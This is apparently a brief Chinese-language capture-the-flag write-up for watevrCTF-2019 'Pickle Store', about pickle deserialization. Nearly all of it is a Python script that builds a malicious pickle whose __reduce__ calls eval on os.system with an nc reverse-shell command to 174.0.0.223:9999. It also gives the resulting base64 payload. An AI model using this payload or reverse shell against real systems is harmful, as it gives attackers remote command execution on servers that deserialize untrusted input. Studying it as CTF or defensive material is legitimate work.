# [watevrCTF-2019]Pickle Store

## 知识点

`pickle反序列化`

## 解题

```python
import base64
import pickle


class A(object):
    def __reduce__(self):
        return (eval, ("__import__('os').system('nc 174.0.0.223 9999 -e/bin/sh')",))
a = A()
print( base64.b64encode( pickle.dumps(a) ) )
#gANjYnVpbHRpbnMKZXZhbApxAFg4AAAAX19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ25jIDE3NC4wLjAuMjIzIDk5OTkgLWUvYmluL3NoJylxAYVxAlJxAy4=
```

